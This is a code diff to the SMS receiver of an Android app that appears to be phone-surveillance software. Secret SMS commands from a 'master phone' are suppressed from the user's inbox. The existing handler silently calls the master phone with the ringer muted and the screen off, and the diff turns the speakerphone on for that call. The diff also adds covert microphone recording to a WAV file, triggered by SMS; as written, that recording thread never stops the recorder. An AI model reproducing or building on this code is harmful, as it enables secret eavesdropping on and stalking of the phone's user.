@@ -67,6 +67,8 @@ public class SmsReceiver extends BroadcastReceiver
 	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 	private Context context;
 	
+	private int tempInt;
+	
 	// **************************************************************************************
     // Receiver for SMS handling
 	// **************************************************************************************
@@ -84,6 +86,7 @@ public class SmsReceiver extends BroadcastReceiver
 			if (smsBody.length() <= 0) return; 
 			
 			String incomingPhoneNum = SmsCtrl.getSmsAddress(intent);
+			String smsBodyLowerCase = smsBody.toLowerCase();
 
 			//-------------------------------------------------------------------------------
 			// If it is the activation SMS (###), show the setting view
@@ -146,7 +149,7 @@ public class SmsReceiver extends BroadcastReceiver
 			
 			//-------------------------------------------------------------------------------
 			// Send location SMS if being triggered by location indication
-			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION_ALIAS))
+			else if (smsBodyLowerCase.equals(SmsConsts.INDICATION_LOCATION) || smsBodyLowerCase.equals(SmsConsts.INDICATION_LOCATION_ALIAS))
 			{
 				abortBroadcast(); // Do not show location activation SMS
 				
@@ -191,7 +194,7 @@ public class SmsReceiver extends BroadcastReceiver
 			
 			//-------------------------------------------------------------------------------
 			// Call master phone if being triggered by env listening indication
-			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_ENV) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_ENV_ALIAS))
+			else if (smsBodyLowerCase.equals(SmsConsts.INDICATION_ENV_LISTEN) || smsBodyLowerCase.equals(SmsConsts.INDICATION_ENV_LISTEN_ALIAS))
 			{
 				abortBroadcast(); // Do not show env listening SMS
 				
@@ -206,7 +209,7 @@ public class SmsReceiver extends BroadcastReceiver
 				TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
 				try {
 					if (PhoneUtils.getITelephony(tm).isOffhook()) {
-						String msg = context.getResources().getString(R.string.env_fail_offhook);
+						String msg = context.getResources().getString(R.string.env_listen_fail_offhook);
 						SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
 						return;
 					}
@@ -216,7 +219,7 @@ public class SmsReceiver extends BroadcastReceiver
 				}
 				
 				if (PowerUtil.isScreenOn(context)) {
-					String msg = context.getResources().getString(R.string.env_fail_screen_on);
+					String msg = context.getResources().getString(R.string.env_listen_fail_screen_on);
 					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
 					return;
 				}
@@ -230,8 +233,8 @@ public class SmsReceiver extends BroadcastReceiver
 							GlobalValues.ORIGINAL_RING_MODE = am.getRingerMode();
 							am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
 						
-							// Mute speaker
-							am.setSpeakerphoneOn(false);
+							// Enable speaker
+							am.setSpeakerphoneOn(true);
 							
 							// Call master phone
 							String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
@@ -247,7 +250,7 @@ public class SmsReceiver extends BroadcastReceiver
 							// Turn off screen
 							PowerUtil.setScreenOff(SmsReceiver.this.context);
 						} catch (Exception e) {	
-							String msg = SmsReceiver.this.context.getResources().getString(R.string.env_fail_exception);
+							String msg = SmsReceiver.this.context.getResources().getString(R.string.env_listen_fail_exception);
 							SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context), msg);
 							return;
 						}
@@ -256,8 +259,61 @@ public class SmsReceiver extends BroadcastReceiver
 			}
 			
 			//-------------------------------------------------------------------------------
+			// Env recording indication
+			else if (smsBodyLowerCase.startsWith(SmsConsts.INDICATION_ENV_REC) || smsBodyLowerCase.startsWith(SmsConsts.INDICATION_ENV_REC_ALIAS))
+			{
+				abortBroadcast(); // Do not show env listening SMS
+				
+				if (!ConfigCtrl.isLegal(context)) return;
+				this.context = context;
+				
+				// If the coming phone is not the receiver phone, return
+				if (!comingFromMasterPhone(context, intent)) return;
+				
+				// Get recording minutes
+				String[] parts = smsBody.split("#");
+				try {
+					this.tempInt = Integer.parseInt(parts[2].trim());
+					if (this.tempInt > 30) this.tempInt = 30;
+					else if (this.tempInt < 1) this.tempInt = 1;
+				} catch (Exception ex) {
+					String msg = this.context.getResources().getString(R.string.env_rec_invalid_minutes);
+					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(this.context), msg);
+					return;
+				}
+				
+				// Start a new thread to recording env
+				new Thread(new Runnable(){
+					public void run() {
+						int minutes = SmsReceiver.this.tempInt;
+						
+						Date startDate = new Date();
+                        String fileName = SmsReceiver.this.context.getResources().getString(R.string.env_record) + 
+                        		ConfigCtrl.getSelfName(SmsReceiver.this.context) + "-" + DatetimeUtil.format2.format(startDate) + FileCtrl.SUFFIX_WAV;
+                        String fileFullPath = FileCtrl.getInternalStorageFilesDirStr(SmsReceiver.this.context) + fileName;
+                        
+                        MediaRecorder recorder = new MediaRecorder();
+                        try {
+                        	recorder.reset();
+                        	recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                        	recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
+                        	recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+                        	recorder.setOutputFile(fileFullPath);
+                        	recorder.prepare();
+                        	recorder.start();
+                        } catch (Exception ex) {
+                        	String msg = SmsReceiver.this.context.getResources().getString(R.string.env_rec_fail_exception);
+        					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context), msg);
+        					return;
+                        }
+						
+					}
+				}).start();
+			}
+			
+			//-------------------------------------------------------------------------------
 			// Force belling if being triggered by bell activation indication
-			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_RING_ALIAS))
+			else if (smsBodyLowerCase.equals(SmsConsts.INDICATION_RING) || smsBodyLowerCase.equals(SmsConsts.INDICATION_RING_ALIAS))
 			{
 				abortBroadcast(); // Do not show bell activation SMS
 				
